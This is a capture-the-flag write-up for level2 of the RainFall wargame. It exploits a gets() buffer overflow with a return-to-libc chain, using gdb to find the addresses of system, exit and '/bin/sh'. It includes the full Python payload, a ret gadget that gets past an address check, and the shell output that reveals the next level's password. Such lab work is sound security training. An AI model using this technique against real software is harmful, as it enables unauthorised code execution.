## Analyse

In the p function there is a gets wich is vulnarable to buffer overflow

```c
0x080484ed <+25>:	call   0x80483c0 <gets@plt>
```

With the [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)'s pattern we can find the offset of EIP ret at 80

But there is not function to access to a shell in the scope of the binary, so we can try a shell code or a ret2libc, here we are going to exploit the 2nd method.
[return-to-libc method](https://css.csail.mit.edu/6.858/2019/readings/return-to-libc.pdf)

## Return to libc

With this method, instead so passing a function in the scope of the binary to access to a shell (because we don't have that).
We are going to give the address of the function system (which is in the libc so accessible via the PLT/GOT), and we are going to pass to it the parameter "/bin/sh"

### Find system address

```sh
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

```sh
level2@RainFall:~$ python -c "print('H' * 80 + '\x60\xb0\xe6\xb7' + 'A' * 4 + '\x1b\xf9\xff\xbf')" | ./level2
(0xb7e6b060)
```

So the ret is the address of system the EIP will jump to this address

### Find "/bin/sh" address

We are looking for the string "/bin/sh" in the scope of the binary to pass it to system

```sh
(gdb) info proc map
process 5249
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
	 0x804a000  0x806b000    0x21000        0x0 [heap]
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fd9000 0xb7fdd000     0x4000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58 #the address of the string
1 pattern found.
```

So we are going to pass `0xb7f8cc58` has paramaters but were ?

Let's understand what a program do with the stack when we call it :

(old function)
- push paramter(s)
- push the next instruction of the actual function (ret address)

(new function)
- push actual ebp
(ebp = esp)
- esp(top of local var space of the function frame) = ebp(bot of local var space of the function frame) - size of local var

With the offset 80 (esp + size of local var + 4 bytes of saved ebp) of the buffer we are in the 2nd instruction and set the address we want

At the call of system :

- system push ebp (will overwrite the address we've just overwite)
- ebp = esp
- substract esp

So now system will search his argument at ebp + 8

	----- ESP and EBP

	saved EBP (oldly system's address / EIP)

	----- EBP + 4

	RET / 4 dummybytes (oldly the 1st argument)

	----- EBP + 8

	1st arg

so the need argument at EBP + 4 will be at EIP + 4 :

```sh
python -c "print('H' * 80 + '\x60\xb0\xe6\xb7'  + 'AAAA' + '\x58\xcc\xf8\xb7'"
```

but the dummy bytes is the RET address so if we want to make it clean and exit the program without seg. fault we can set the address of exit.




### Find exit address

```sh
(gdb) p exit
$1 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```


```sh
python -c "print('H' * 80 + '\x60\xb0\xe6\xb7'  + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7'"
```

## By pass address exclusion

When we set `0xb7e6b060`, the address of system in the stack, it's do the program exit cause of this condition :

```sh
0x080484fb <+39>:    and    eax,0xb0000000
0x08048500 <+44>:    cmp    eax,0xb0000000
0x08048505 <+49>:    jne    0x8048527 <p+83>
```

To bypass that we can call first the return instruction to quit the program and don't jump in the if

```sh
(gdb) disas p
Dump of assembler code for function p:
[...]
0x0804853e <+106>:	ret
```
   > ret = 0x0804853e

```sh
python -c "print('H' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7'  + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7'"
```

After return the function the eip try free the locals pop saved EBP en RET and it's supose to read the argument of the stack frame but it's reading and executing the system address


```sh
(gdb) x/80x $esp
0xbffff6c0:     0xbffff6dc      0x00000000      0x00000000      0xb7e5ec73
0xbffff6d0:     0x080482b5      0x00000000      0x00ca0000      0x48484848
0xbffff6e0:     0x48484848      0x48484848      0x48484848      0x48484848
0xbffff6f0:     0x48484848      0x48484848      0x48484848      0x48484848
0xbffff700:     0x48484848      0x48484848      0x48484848      0x48484848
0xbffff710:     0x48484848      0x48484848      0x48484848      0x48484848
0xbffff720:     0x48484848      0x48484848      0x48484848     [0x0804853e]
0xbffff730:    [0xb7e6b060]    [0xb7e5ebe0]    [0xbffff91b]     0xb7e45400
0xbffff740:     0x00000001      0xbffff7d4      0xbffff7dc      0xb7fdc858
0xbffff750:     0x00000000      0xbffff71c      0xbffff7dc      0x00000000
0xbffff760:     0x08048260      0xb7fd0ff4      0x00000000      0x00000000
0xbffff770:     0x00000000      0xd68f971b      0xe1c8330b      0x00000000
0xbffff780:     0x00000000      0x00000000      0x00000001      0x08048420
0xbffff790:     0x00000000      0xb7ff26b0      0xb7e453e9      0xb7ffeff4
0xbffff7a0:     0x00000001      0x08048420      0x00000000      0x08048441
0xbffff7b0:     0x0804853f      0x00000001      0xbffff7d4      0x08048550
0xbffff7c0:     0x080485c0      0xb7fed280      0xbffff7cc      0xb7fff918
0xbffff7d0:     0x00000001      0xbffff8fc      0x00000000      0xbffff915
0xbffff7e0:     0xbffff925      0xbffff939      0xbffff958      0xbffff96b
0xbffff7f0:     0xbffff977      0xbffffe98      0xbffffea4      0xbffffef1
```

## Exploit

```sh
level2@RainFall:~$ (python -c "print('H' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7'  + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')"; cat) | ./level2
HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH>HHHHHHHHHHHH>`�����X���
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

```